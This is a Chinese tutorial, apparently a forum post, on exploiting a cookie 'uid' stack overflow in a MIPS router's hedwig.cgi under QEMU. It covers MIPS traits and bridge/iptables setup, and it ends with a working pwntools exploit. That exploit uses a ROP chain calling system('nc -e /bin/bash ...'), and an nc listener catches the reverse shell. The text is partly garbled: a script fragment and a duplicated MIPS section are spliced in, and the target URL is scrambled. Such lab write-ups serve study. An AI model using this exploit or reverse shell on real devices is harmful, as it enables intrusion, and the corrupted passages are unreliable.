![图片描述](upload/attach/202511/1005607_TE4CBW9FV5HYEUJ.webp)

![图片描述](upload/attach/202511/1005607_AT5GE6SM8CGA39V.webp)

再继续往下看`sobj_add_char()`函数的功能就和它的函数名字一样，用于添加字符。

而下面这一段程序的作用就是将`=`前面的内容给`v2`，将`=`后面的内容给`v5`。

![图片描述](upload/attach/202511/1005607_E9FBCR2ZGX7BEXG.webp)

再往下看，这里判断`v2`的内容是不是`uid`，判断之后将`v4`的内容放入`string`中，然后再拼接到`a1`里面。

![图片描述](upload/attach/202511/1005607_AQ6KSY82HKVWHGK.webp)

所以我们可以得到的结论就是`sess_get_uid()`函数的作用就是将`COOKIE`中`uid=`后面的内容提取出来。

再次回到我们的`hedwigcgi_main()`函数，我们可以看到下面的`sprintf()`函数，这个`sprintf()`函数就是我们的一个漏洞点。

![图片描述](upload/attach/202511/1005607_JZ584QRYSBA9NDQ.webp)

通过阅读代码逻辑，`sprintf()`函数的第四个参数`string`其实就是`v4`，而这里的`v4`我们通过上面分析可以得知，`v4`其实就是传入的`cookie`中的`uid=`后面的内容。这个部分的内容以及长度其实我们是可以控制的，而我们的`v27`数组的大小为`1024`，所以这里可能存在栈溢出。

![图片描述](upload/attach/202511/1005607_46J7KWCTD97GDK5.webp)

而继续往下阅读代码，在`hedwigcgi_main()`函数的133行同样还有一个`sprintf()`函数，同样也是往`v27`这个数组中输入。

输入的内容`v20`的内容也是`v4`，而`v4`从第一个`sprintf()`函数到这第二个`sprintf()`函数没有发生改变，所以同样`v4`也是`cookie`中的`uid=`后面的内容。所以利用漏洞的时候我们只需要将`cookie`的`uid=`后面的内容当成`payload`来输入就行了。

### MIPS基础知识

mips架构(32位下的mipsel)的特性：

1. 叶子函数和非叶子函数

`叶子函数`是指没有调用任何别子函数的函数，它的返回地址会存放在`$ra`寄存器中，在叶子函数结束的时候程序会通过`$ra`寄存器进行跳转返回，如下图所示。

![图片描述](upload/attach/202511/1005607_F5C5EKXAMKQSUR9.webp)

`非叶子函数`是指调用了其他子函数的函数，它的返回地址`$ra`会在程序开始的时候通过`sw`指令存放到栈上，如下图所示。

![图片描述](upload/attach/202511/1005607_SJNG5D8F2M9B7GH.webp)

这是因为它其中调用了别的函数会改变它的`$ra`寄存器的值，所以需要依靠栈来保存地址。

然后在函数结束的时候再通过`lw`指令取出并跳转返回。

![图片描述](upload/attach/202511/1005607_RRBMEEGBSTMXDMW.webp)

2. 流水线效应

最为常见的就是`跳转指令`，比如`jalr`导致的`分支延迟效应`。

而`分支跳转语句`后面的那条语句叫做`分支延迟槽`。

就是说，当它跳转指令填充好跳转地址，但是还没来得及跳转过去的时候，跳转指令的下一条指令（分支延迟槽）就已经执行了。

也就是说mips架构在执行跳转指令的时候`会先执行跳转指令的后一条指令，然后再进行跳转`。

3. 缓存不一致性

指的是`指令缓存区--Instruction Cache`和`数据缓存区--Data Cache`的同步需要一定的时间。

比如，我们将一段shellcode写入到栈上，那么此时shellcode还属于数据缓存区，如果我们直接跳转过去执行就会出现一些问题。因此我们需要调用一下`sleep()`函数先停一下，让`数据缓存区`能够变成`指令缓冲区`，然后再进行跳转，这样就不会出错了。虽然直接跳转可能也不会出错，但是sleep一下更加稳妥。

0)

sudo rm /etc/network/interfaces
sudo cp /etc/network/interfaces.brk /etc/network/interfaces
sudo /etc/init.d/networking restart

;;
1)
echo "正在切换至 interfaces.brk2 配置..."
sudo rm /etc/network/interfaces
sudo cp /etc/network/interfaces.brk2 /etc/network/interfaces
sudo /etc/init.d/networking restart
echo "配置切换完成！"
;;
"")
# 无参数时提示用法
echo "用法：$0 [0|1]"
echo " 0 - 使用 interfaces.brk 配置"
echo " 1 - 使用 interfaces.brk2 配置"
exit 1
;;
\*)

;;

### MIPS 基础知识

MIPS 架构（32 位下的 mipsel）的特性：

1. 叶子函数和非叶子函数

   `叶子函数`是指没有调用任何别的子函数的函数，它的返回地址会存放在 `$ra` 寄存器中，在叶子函数结束的时候程序会通过 `$ra` 寄存器进行跳转返回，如下图所示。

   ![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_F5C5EKXAMKQSUR9.webp)

   `非叶子函数`是指调用了其他子函数的函数，它的返回地址 `$ra` 会在程序开始的时候通过 `sw` 指令存放到栈上，如下图所示。

   ![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_SJNG5D8F2M9B7GH.webp)

   这是因为它其中调用了别的函数会改变它的 `$ra` 寄存器的值，所以需要依靠栈来保存地址。

   然后在函数结束的时候再通过 `lw` 指令取出并跳转返回。

   ![图片描述](https://bbs.kanxue.com/upload/attach/202511/1005607_RRBMEEGBSTMXDMW.webp)

2. 流水线效应

   最为常见的就是跳转指令比如 `jalr` 导致的分支延迟效应。

   而分支跳转语句后面的那条语句叫做分支延迟槽。

   就是说，当跳转指令填充好跳转地址，但是还没来得及跳转过去的时候，跳转指令的下一条指令（分支延迟槽）就已经执行了。

   也就是说 MIPS 架构在执行跳转指令的时候，会先执行跳转指令的后一条指令，然后再进行跳转。

3. 缓存不一致性

   指的是指令缓存区（Instruction Cache）和数据缓存区（Data Cache）的同步需要一定的时间。

   比如，我们将一段 `shellcode` 写入到栈上，那么此时 `shellcode` 还属于数据缓存区，如果我们直接跳转过去执行就会出现一些问题，因此我们需要调用一下 `sleep()`函数先停一下，让数据缓存区能够变成指令缓冲区，然后再进行跳转，这样就不会出错了。虽然直接跳转可能也不会出错，但是 `sleep` 一下更加稳妥。

### step2 创建网桥

开始模拟之前我们需要开启物理机的ip转发功能，以及创建网桥来连接到`qemu`虚拟机。

首先安装网络配置工具。

```
apt-get install bridge-utils uml-utilities
```

然后修改`interfaces`文件。

```
sudo vim /etc/network/interfaces
```

一些新版本的Ubuntu里面可能没有`interfaces`这个问题，我们可以使用下面指令来安装。

```
sudo apt install ifupdown
```

修改`interfaces`文件内容如下（修改之前可以先备份一份，`sudo cp /etc/network/interfaces /etc/network/interfaces.brk`）。
下面使用`ip addr`指令来查看我们系统使用的是什么接口，一般是`eth0`或`ens33`。

eth0如下：

```text
auto lo
iface lo inet loopback

auto eth0
iface eth0 inet dhcp
up ifconfig eth0 0.0.0.0 up

auto br0
iface br0 inet dhcp

bridge_ports eth0
bridge_maxwait 0
```

ens33如下：

```text
auto lo
iface lo inet loopback

auto ens33
iface ens33 inet dhcp
up ifconfig ens33 0.0.0.0 up

auto br0
iface br0 inet dhcp

bridge_ports ens33
bridge_maxwait 0
```

这里修改完之后可以使用指令`sudo /etc/init.d/networking restart`来重启一下网络配置。
再备份一次`sudo cp /etc/network/interfaces /etc/network/interfaces.brk2`。
备份好之后我们可以写一个脚本用来在两个不同的版本之间切换，我写的脚本如下。

```bash
# net_cg
#!/bin/bash

# 功能说明：切换网络配置文件并重启服务
# 用法：net_cg [0|1]
# 参数：0 - 使用 interfaces.brk；1 - 使用 interfaces.brk2

case "$1" in
  0)
    echo "正在切换至 interfaces.brk 配置..."
    sudo rm /etc/network/interfaces
    sudo cp /etc/network/interfaces.brk /etc/network/interfaces
    sudo /etc/init.d/networking restart
    echo "配置切换完成！"
    ;;
  1)
    echo "正在切换至 interfaces.brk2 配置..."
    sudo rm /etc/network/interfaces
    sudo cp /etc/network/interfaces.brk2 /etc/network/interfaces
    sudo /etc/init.d/networking restart
    echo "配置切换完成！"
    ;;
  "")
    # 无参数时提示用法
    echo "用法：$0 [0|1]"
    echo "  0 - 使用 interfaces.brk 配置"
    echo "  1 - 使用 interfaces.brk2 配置"
    exit 1
    ;;
  *)
    # 非法参数报错
    echo "错误：无效参数 '$1'"
    echo "支持的参数：0 或 1"
    exit 1
    ;;
esac
```

在`/etc/qemu-ifup`文件中写入下面内容（如果没有则需要创建，然后使用`sudo chmod a+x /etc/qemu-ifup`），注意是`写入`，`不是`改成下面内容。

```sh
#!/bin/sh
echo "Executing /etc/qemu-ifup"
echo "Bringing up $1 for bridge mode..."
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0..."
sudo /sbin/brctl addif br0 $1
sleep 2
```

还需要`开启物理机的转发功能`（写成脚本如下）。

```sh
#!/bin/sh
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

这里做完之后可以使用指令`ip addr`来查看一下虚拟网卡是否已经准备就绪。

然后到`/etc`文件中创建一个`/qemu/bridge.conf`，在这个文件中写入`allow br0`。

所有东西成功后进行保存，然后`重启我们的Ubuntu系统`。

## 获取 Shell

打 QEMU 虚拟机想要拿到 Shell，就需要利用反弹 Shell。我们需要在 Ubuntu 虚拟机中开启一个终端用于接收反弹 Shell：

```bash
nc -lvnp 8888
```

下面构建 exp 脚本，攻击`192.168.xx.xx:1234`使其执行`system('nc -e /bin/bash 192.168.xx.xxx 8888')`。注意这里是 Ubuntu 物理机的 IP。

### exp 脚本

```python
from pwn import *
import requests

context(os='linux', arch='mips', log_level='debug')

cmd = b'nc -e /bin/bash 192.168.xx.xxx 8888'  # 这里是Ubuntu物理机的地址

libc_base = 0x77f34000

payload = b'a' * 0x3cd
payload += p32(libc_base + 0x53200 - 1)  # s0  system_addr - 1
payload += p32(libc_base + 0x169C4)      # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)
payload += b'a' * (4 * 7)
payload += p32(libc_base + 0x32A98)      # ra  addiu $s0, 1 (=> jalr $s1)
payload += b'a' * 0x18
payload += cmd

url = "255K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5&6x3W2)9J5k6e0p5$3z5q4)9J5k6i4S2^5i4K6u0W2P5s2S2Q4x3@1p5I4x3U0x3@1i4K6u0r3K9r3g2V1N6$3W2Y4i4K6u0W2j5$3N6A6"  # 这里是QEMU虚拟机的地址

data = {"XiDP": "pwner"}

headers = {
    "Cookie": b"uid=" + payload,
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "10"
}

res = requests.post(url=url, headers=headers, data=data)
print(res)
```

然后我们就可以在执行`nc -lvnp 8888`的终端拿到 Shell 了，当然前提是 exp 无误。
